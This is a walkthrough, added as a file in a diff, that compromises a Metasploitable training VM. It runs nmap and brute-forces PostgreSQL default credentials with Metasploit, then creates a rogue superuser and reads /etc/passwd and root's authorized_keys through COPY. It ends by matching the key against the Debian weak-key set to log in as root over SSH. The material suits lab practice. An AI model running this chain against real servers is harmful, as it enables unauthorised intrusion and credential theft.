@@ -1,0 +1,383 @@
+STEPS TO HACK PostgreSQL DATABASE & CRACK SSH ROOT PASSWORD
+===========================================================
+1. NMAP SCAN TARGET
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+****************************************************************1. NMAP SCAN TARGET
+====================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-06 21:38 EDT
+Nmap scan report for 192.168.209.151
+Host is up (0.0019s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+MAC Address: 00:0C:29:DA:D0:D3 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds
+
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+==================================================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151 > postgresSCAN.txt
+root@alice:~# egrep -i '(5432|22)' postgresSCAN.txt
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+root@alice:~# 
+
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+============================================
+root@alice:~# msfconsole
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v4.16.54-dev                         ]
++ -- --=[ 1757 exploits - 1006 auxiliary - 306 post       ]
++ -- --=[ 536 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf exploit(multi/handler) > search postgres
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Description
+   ----                                                       ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
+   auxiliary/analyze/jtr_postgres_fast                                         normal     John the Ripper Postgres SQL Password Cracker
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_hashdump                                normal     Postgres Password Hashdump
+   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_schemadump                              normal     Postgres Schema Dump
+   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/multi/postgres/postgres_createlang                 2016-01-01       good       PostgreSQL CREATE LANGUAGE Execution
+   exploit/windows/misc/manageengine_eventlog_analyzer_rce    2015-07-11       manual     ManageEngine EventLog Analyzer Remote Code Execution
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+msf exploit(multi/handler) > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(scanner/postgres/postgres_login) > show options
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME                                                                                        no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+Suppose you are able to correctly guess the username and password of the PostgreSQL database, but not the database name. 
+msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.209.151
+RHOSTS => 192.168.209.151
+msf auxiliary(scanner/postgres/postgres_login) > run
+[-] 192.168.209.151:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.209.151:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[+] 192.168.209.151:5432 - Login Successful: postgres:postgres@template1
+
+
+*** Same results by manually setting the database as template1
+==============================================================
+msf auxiliary(scanner/postgres/postgres_login) > set DATABASE template1
+DATABASE => template1
+msf auxiliary(scanner/postgres/postgres_login) > run
+[+] 192.168.209.151:5432 - Login Successful: postgres:postgres@template1
+
+[-] 192.168.209.151:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/postgres/postgres_login) > USE POSTGRES LOGIN CREDENTIALS TO DO ADMIN STUFF
+
+DETERMINE DATABASE VERSION
+==========================
+msf auxiliary(scanner/postgres/postgres_login) > set RHOST 192.168.209.151
+[!] RHOST is not a valid option for this module. Did you mean RHOSTS?
+RHOST => 192.168.209.151
+msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.209.151
+RHOSTS => 192.168.209.151
+msf auxiliary(scanner/postgres/postgres_login) > set DATABASE template1 
+DATABASE => template1
+msf auxiliary(scanner/postgres/postgres_login) > exploit
+[-] 192.168.209.151:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[+] 192.168.209.151:5432 - Login Successful: postgres:postgres@template1
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/postgres/postgres_login) > back
+
+LOGIN INTO THE VICTIM WITH YOUR COLLECTED/CONFIRMED CREDENTIALS
+==============================================================
+
+root@alice:~# psql -h 192.168.209.151 -U postgres -W
+Password for user postgres: 
+psql (10.3 (Debian 10.3-2), server 8.3.1)
+SSL connection (protocol: TLSv1, cipher: DHE-RSA-AES256-SHA, bits: 256, compression: off)
+Type "help" for help.
+postgres=#
+
+
+1. Displays all usernames of the database.
+==============================================
+
+postgres=# select * from pg_user;
+ usename  | usesysid | usecreatedb | usesuper | usecatupd |  passwd  | valuntil | useconfig 
+----------+----------+-------------+----------+-----------+----------+----------+-----------
+ postgres |       10 | t           | t        | t         | ******** |          | 
+(1 row)
+
+postgres=# select usename, passwd from pg_shadow;
+ usename  |               passwd                
+----------+-------------------------------------
+ postgres | md53175bce1d3201d16594cebf9d7eb3f9d
+(1 row)
+
+postgres=# select current_database();
+ current_database 
+------------------
+ postgres
+(1 row)
+
+2. Create user "noondi", default PRIVILEGE set to FALSE
+=======================================================
+
+postgres=# CREATE USER noondi WITH PASSWORD 'abc@123';
+CREATE ROLE
+postgres=# select * from pg_user;
+ usename  | usesysid | usecreatedb | usesuper | usecatupd |  passwd  | valuntil | useconfig 
+----------+----------+-------------+----------+-----------+----------+----------+-----------
+ postgres |       10 | t           | t        | t         | ******** |          | 
+ noondi   |    16392 | f           | f        | f         | ******** |          | 
+(2 rows)
+
+3. MAKE CREATED USER "noondi" A SUPERUSER WITH ALTER COMMAND, PRIVILEGE SET TO TRUE
+===================================================================================
+ postgres=# ALTER USER noondi WITH SUPERUSER;
+ALTER ROLE
+postgres=# select * from pg_user;
+ usename  | usesysid | usecreatedb | usesuper | usecatupd |  passwd  | valuntil | useconfig 
+----------+----------+-------------+----------+-----------+----------+----------+-----------
+ postgres |       10 | t           | t        | t         | ******** |          | 
+ noondi   |    16392 | f           | t        | t         | ******** |          | 
+(2 rows)
+
+postgres=# 
+
+4. SHOW SCHEMA WITH \dn AND DATABASE WITH \l
+============================================
+
+postgres=# \dn
+  List of schemas
+  Name  |  Owner   
+--------+----------
+ public | postgres
+(1 row)
+
+postgres=# \l
+                    List of databases
+   Name    |  Owner   | Encoding |   Access privileges   
+-----------+----------+----------+-----------------------
+ postgres  | postgres | UTF8     | 
+ template0 | postgres | UTF8     | =c/postgres          +
+           |          |          | postgres=CTc/postgres
+ template1 | postgres | UTF8     | =c/postgres          +
+           |          |          | postgres=CTc/postgres
+(3 rows)
+
+postgres=# 
+
+5. CREATE Table AND ACCESS /etc/passwd
+======================================
+1. Create a table called accounts.
+postgres=# CREATE TABLE accounts (invaded_users TEXT);
+CREATE TABLE
+
+2. opy the /etc/passwd file into the accounts table.
+postgres=# COPY accounts from '/etc/passwd';
+COPY 37
+
+3. **Display records from the accounts table that contains the %bash% string
+**Users with a /bin/bash shell can do remote login into servers.
+
+postgres=# select * from accounts where invaded_users like '%bash%';
+                                invaded_users                                 
+------------------------------------------------------------------------------
+ root:x:0:0:root:/root:/bin/bash
+ msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+ postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+ service:x:1002:1002:,,,:/home/service:/bin/bash
+ dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+(6 rows)
+
+postgres=# 
+
+Retrieving root's authorized_keys file
+======================================
+1. Create a table named sshkeys.
+postgres=# CREATE TABLE sshkeys (auth_key TEXT);
+CREATE TABLE
+
+2. potential victim accounts with a /bin/bash shell.
+postgres=# select * from accounts where invaded_users like '%bash%';
+                                invaded_users                                 
+------------------------------------------------------------------------------
+ root:x:0:0:root:/root:/bin/bash
+ msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+ postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+ service:x:1002:1002:,,,:/home/service:/bin/bash
+ dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+(6 rows)
+
+3. Copy root's authorized_keys file into the sshkeys table.  
+This is only possible because of improper permissions.
+postgres=# COPY sshkeys from '/root/.ssh/authorized_keys';
+COPY 2
+4. QUIT DATABASE
+postgres=# \q
+
+5 The -c 'select * from sshkeys limit 1', the (-c) flag will allow 
+you to execute a query remotely from command line without invoking the psql shell.
+psql -h 192.168.209.151 -U postgres -c 'select * from sshkeys limit 1' | tee sshkeys.txt
+
+6 Search and Find SSH Private Key
+root@alice:~# psql -h 192.168.209.151 -U postgres -c 'select * from sshkeys limit 1' | tee sshkeys.txt
+Password for user postgres: 
+                                                                                                                                                                                                       auth_key                                                                                                                                                                                                       
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPF
+ SbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa6
+ 6X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWo
+ cyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALT
+ p3w== msfadmin@metasploitable
+(1 row)
+
+root@alice:~# ls -l sshkeys.txt
+-rw-r--r-- 1 root root 1229 May  7 02:41 sshkeys.txt
+root@alice:~# 
+
+7. use (sed) to remove "==" that is at the end ($) of the line. 
+root@alice:~# grep "ssh-rsa" sshkeys.txt | awk '{print $2}' | sed 's/==$//'
+AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQql
+dJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXv
+SjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2z
+W1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfd
+w5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w
+
+8. Download ssh public keys to make password file for bruteforce
+root@alice:~# wget --no-check-certificate  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2--2018-05-07 14:31:53--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
+Resolving github.com (github.com)... 192.30.253.113, 192.30.253.112
+Connecting to github.com (github.com)|192.30.253.113|:443... connected.
+
+9. extract ssh public keys from downloaded file
+
+root@alice:~# ls -l 5622*
+-rw-r--r-- 1 root root 50226987 May  7 14:33 5622.tar.bz2
+root@alice:~# tar xvjf 5622.tar.bz2
+rsa/
+rsa/2048/
+rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
+rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
+rsa/2048/0bdcea11b2c628c7fd8bc4b04ca43668-12474
+rsa/2048/3fabfedd883c3cef69881a4fc30fdac7-3828.pub
+rsa/2048/a508919ec49fcf91ad0ecf8472349d9b-3039.pub
+rsa/2048/9ddc1879b9ac311f24a81e835aac5866-28340.pub
+rsa/2048/37cb6c02b84dfab70b7e0ad014a00414-27656.pub
+rsa/2048/17b33876782270d00f0aa284757e82ba-15477.pub
+rsa/2048/be74666ad474495ab736fc3202477d84-6942
+
+
+10. Use (fgrep) to search the previously downloaded ssh public keys, 
+output from command #7.  
+
+NOTICE HOW COMMAND #7 IS EMBEDED IN THE FGREP COMMAND
+fgrep `grep "ssh-rsa" sshkeys.txt | awk '{print $2}' | sed 's/==$//'` /root/rsa/2048/*pub | tee keys.txt
+
+root@alice:~# fgrep `grep "ssh-rsa" sshkeys.txt | awk '{print $2}' | sed 's/==$//'` /root/rsa/2048/*pub | tee keys.txt
+/root/rsa/2048/57c3115d77c56390332dc5c49978627a-5429.pub:ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== root@targetcluster
+root@alice:~# 
+
+11. Use SSH Private Key to become ROOT
+======================================
+
+11.a DISPLAY KEYS 
+root@alice:~# cat keys.txt
+/root/rsa/2048/57c3115d77c56390332dc5c49978627a-5429.pub:ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== root@targetcluster
+root@alice:~# 
+
+11.b PRINT FIRST FIELD DELIMITED BY a ":"
+root@alice:~# cat keys.txt | awk -F: '{print $1}'
+/root/rsa/2048/57c3115d77c56390332dc5c49978627a-5429.pub
+root@alice:~# 
+
+11.c REMOVE ".pub" FROM THE OUTPUT
+ root@alice:~# ssh -i `cat keys.txt | awk -F: '{print $1}' | sed 's/.pub//'` root@192.168.209.151
+The authenticity of host '192.168.209.151 (192.168.209.151)' can't be established.
+RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
+Are you sure you want to continue connecting (yes/no)? yes
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+root@metasploitable:~# 
+
+
+11.d establish a secure connection; use the (-i) flag to specify the sshkey; 
+connect as username root to the metasploitable VM.
+
+root@alice:~# ssh -i /root/rsa/2048/57c3115d77c56390332dc5c49978627a-5429 root@192.168.209.151
+Last login: Mon Apr 23 08:08:16 2018 from 192.168.209.179
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+root@metasploitable:~# 
